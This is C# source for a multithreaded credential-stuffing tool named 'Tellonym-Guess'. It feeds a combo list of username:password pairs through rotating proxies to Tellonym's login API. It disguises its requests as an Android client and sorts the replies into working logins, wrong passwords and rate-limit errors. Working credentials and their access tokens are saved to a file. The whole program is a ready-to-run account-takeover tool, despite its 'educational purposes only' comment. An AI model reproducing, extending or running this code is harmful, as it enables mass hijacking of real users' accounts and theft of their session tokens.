using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
namespace Tellonym_Guess
{
    class Program
    {
        /// <summary>
        /// Notice That Program For Educational Purposes Only !
        /// Tellonym Api Used
        /// </summary>
        #region Statics
        static bool Stop;
        static List<string> Combo;
        static List<string> Proxies;
        static int ThreadInt, ComboInt;
        static int Good, Bad, Err;
        #endregion
        #region Api
        static string Login(string User, string Pass)
        {
            string cfuid = Guid.NewGuid().ToString().Replace("-", string.Empty) + Guid.NewGuid().ToString().Split(new char[] { '-' })[0] + Guid.NewGuid().ToString().Split(new char[] { '-' })[1] + Guid.NewGuid().ToString().Split(new char[] { '-' })[2];
            string Resp = "";
            try
            {
                byte[] Bytes = new UTF8Encoding().GetBytes("{\"country\":\"US\",\"deviceName\":\"Xiaomi Xiaomi Mi A2 Lite Android 10\",\"deviceType\":\"android\",\"lang\":\"en\",\"email\":\"" + User + "\",\"password\":\"" + Pass + "\",\"idfa\":\"" + Guid.NewGuid().ToString() + "\",\"limit\":16}");
                HttpWebRequest SqlReq = WebRequest.CreateHttp("https://api.tellonym.me/tokens/create");
                SqlReq.Proxy = new WebProxy(Proxies[new Random().Next(0, Proxies.Count - 1)]);
                SqlReq.Method = "POST";
                SqlReq.Host = "api.tellonym.me";
                SqlReq.Accept = "application/json";
                SqlReq.Headers.Add("tellonym-client", "android");
                SqlReq.ContentType = "application/json;charset=utf-8";
                SqlReq.Headers.Add($"cookie: __cfduid={cfuid}");
                SqlReq.UserAgent = "okhttp/3.12.1";
                SqlReq.ContentLength = Bytes.Length;
                Stream SqlStream = SqlReq.GetRequestStream();
                SqlStream.Write(Bytes, 0, Bytes.Length);
                SqlStream.Dispose(); SqlStream.Close();
                StreamReader SqlReader = new StreamReader(((HttpWebResponse)SqlReq.GetResponse()).GetResponseStream());
                Resp = SqlReader.ReadToEnd(); SqlReader.Dispose(); SqlReader.Close();
                if (Resp.Contains("accessToken"))
                {
                    string Token = Regex.Match(Resp, "\"accessToken\":\"(.*?)\",\"").Groups[1].Value;
                    string Date = Regex.Match(Resp, "\"createdAt\":\"(.*?)\"").Groups[1].Value;
                    Good++; SaveIt(User, Pass, Token, Date); UpdateTitle();
                }
                else
                {
                    Err++; UpdateTitle();
                }
            }
            catch (WebException e)
            {
                Resp = new StreamReader(e.Response.GetResponseStream()).ReadToEnd();
                if (Resp.Contains("RATELIMIT_REACHED"))
                {
                    Err++; UpdateTitle();
                }
                else if (Resp.Contains("WRONG_CREDENTIALS"))
                {
                    Bad++; UpdateTitle();
                }
            }
            return Resp;
        }
        #endregion
        #region Threading | Saving | Else
        static void UpdateTitle()
        {
            Console.Title = $"Sql-Tellonym-Guess [:] Good : {Good} [:] Wrong : {Bad} [:] Error : {Err} [:]";
        }
        static void SaveIt(string User, string Pass, string Token, string Date)
        {
            StringBuilder Sb = new StringBuilder();
            Sb.AppendLine($"User : {User}");
            Sb.AppendLine($"Pass : {Pass}");
            Sb.AppendLine($"Token : {Token}");
            Sb.AppendLine($"Date : {Date}");
            Sb.AppendLine($"Done At : {DateTime.Now}");
            File.AppendAllText("Good.txt", Sb.ToString());
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[+] User : [" + User + "] ~~> Done :)");
        }
        static void System()
        {
            for (int x = 0; x < ThreadInt; x++)
            {
                var Thread = new Thread(new ThreadStart(ComboSystem))
                {
                    IsBackground = false,
                    Priority = ThreadPriority.Highest
                }; Thread.Start();
            }
        }
        static void ComboSystem()
        {
            while (Stop != true)
            {
                try
                {
                    if (ComboInt >= Combo.Count - 1)
                        ComboInt = 0;
                    string UserPass = Combo[ComboInt];
                    if (UserPass.Contains(":"))
                        Login(UserPass.Split(new char[] { ':' })[0], UserPass.Split(new char[] { ':' })[1]);
                    else
                        GC.Collect();
                    ComboInt++;
                }
                catch (Exception)
                {
                    GC.Collect(GC.MaxGeneration);
                }
                Thread.Sleep(new Random().Next(50, 300));
            }
        }
        #endregion
        static void Main()
        {
            Console.Title = "[+] Sql-Tellonym-Guess [+]";
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.Write(@"
  ______     ____                                  ______                    
 /_  __/__  / / /___  ____  __  ______ ___        / ____/_  _____  __________
  / / / _ \/ / / __ \/ __ \/ / / / __ `__ \______/ / __/ / / / _ \/ ___/ ___/
 / / /  __/ / / /_/ / / / / /_/ / / / / / /_____/ /_/ / /_/ /  __(__  |__  ) 
/_/  \___/_/_/\____/_/ /_/\__, /_/ /_/ /_/      \____/\__,_/\___/____/____/  
                         /____/                                              

");
            Console.ForegroundColor = ConsoleColor.White;
            #region Optimize
            ServicePointManager.UseNagleAlgorithm = false;
            ServicePointManager.Expect100Continue = false;
            ServicePointManager.CheckCertificateRevocationList = false;
            ServicePointManager.DefaultConnectionLimit = int.MaxValue;
            ThreadPool.SetMinThreads(int.MaxValue, int.MaxValue);
            ServicePointManager.DefaultConnectionLimit = int.MaxValue;
            try { Combo = new List<string>(File.ReadAllLines("Combo.txt")); } catch { Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine("[+] Combo Not Found :("); Console.ReadKey(); return; }
            try { Proxies = new List<string>(File.ReadAllLines("Proxies.txt")); } catch { Console.ForegroundColor = ConsoleColor.Red; Console.WriteLine("[+] Proxies Not Found :("); Console.ReadKey(); return; }
            Stop = false;
            #endregion
            Console.Write("[+] Threads : "); Console.ForegroundColor = ConsoleColor.Magenta;
            ThreadInt = int.Parse(Console.ReadLine());
            new Thread(new ThreadStart(System), new Random().Next(1000, 5000)) { IsBackground = false, Priority = ThreadPriority.Highest }.Start();
        }
    }
}